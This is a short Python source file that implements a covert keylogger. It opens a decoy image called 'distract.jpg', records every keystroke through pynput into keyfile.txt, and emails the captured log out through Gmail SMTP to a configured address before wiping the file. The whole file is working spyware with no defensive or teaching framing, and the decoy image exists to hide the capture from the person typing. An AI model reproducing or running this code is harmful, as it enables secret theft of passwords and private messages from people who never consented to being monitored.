import os
from pynput import keyboard
from datetime import datetime
import smtplib
import time
from email.mime.text import MIMEText

EMAIL_ADDRESS =       
EMAIL_PASSWORD =   
TO_EMAIL = EMAIL_ADDRESS
TXT_FILE = "keyfile.txt"                        
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def send_file_contents():
    # Read file contents
    with open(TXT_FILE, "r") as f:
        contents = f.read().strip()

    if not contents:
        print("No new content to send.")
        return

    # Create email
    msg = MIMEText(contents, "plain")
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg["Subject"] = "Automated TXT File Update"

     # Send email
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print("Email sent successfully.")
    except Exception as e:
        print("Error sending email:", e)
        return

    # Clear file after sending
    with open(TXT_FILE, "w") as f:
        f.write("")


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            else:
                logKey.write(f'[{key.name}]')



if __name__ == "__main__":
    # Opens the image 
    os.startfile("distract.jpg")  

    # Start the keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    # send txt file
    send_file_contents()
    time.sleep(1)

  

    



